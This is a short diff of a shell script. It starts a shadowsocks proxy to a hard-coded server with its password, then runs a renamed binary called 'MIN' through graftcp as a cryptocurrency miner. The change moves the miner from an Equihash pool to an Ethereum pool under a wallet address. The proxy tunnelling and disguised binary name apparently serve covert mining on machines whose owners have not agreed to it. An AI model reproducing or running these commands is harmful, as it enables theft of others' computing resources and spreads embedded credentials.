@@ -44,5 +44,5 @@ apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp ./MIN --algo Equihash --pers auto --server stratum+tcp://zen.global.luxor.tech --port 700 --user prodent.theodore
+./graftcp/graftcp ./MIN --algo ethash --pers auto --server eth.cruxpool.com --port 5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5
 sleep 2
